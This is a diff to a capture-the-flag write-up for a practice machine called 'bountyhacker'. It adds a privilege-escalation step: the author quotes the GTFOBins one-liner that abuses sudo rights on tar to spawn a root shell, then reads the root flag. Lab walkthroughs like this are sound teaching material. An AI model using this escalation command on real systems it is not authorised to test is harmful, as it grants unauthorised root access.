@@ -11,6 +11,7 @@
 
 - [ftp](../../tools/ftp.md)
 - [hydra](../../tools/hydra.md)
+- [GTFOBins](https://gtfobins.github.io/)
 
 ## Room Description
 
@@ -207,4 +208,23 @@ Matching Defaults entries for REDACTED on bountyhacker:
 
 User REDACTED may run the following commands on bountyhacker:
     (root) /bin/tar
+```
+
+I immediately checked [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo) for an exploit with tar if the user can run as sudo. Luckily, it has one. Here is what GTFOBins says:
+
+> Sudo
+> 
+> If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+> 
+> ```bash
+> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+> ```
+
+I run that command and type in the username's password.
+
+It worked. I'm in! The cursor changed to the # character to let me know that I am root. I ran the following to get the flag:
+
+```bash
+# cat /root/root.txt
+REDACTED
 ```
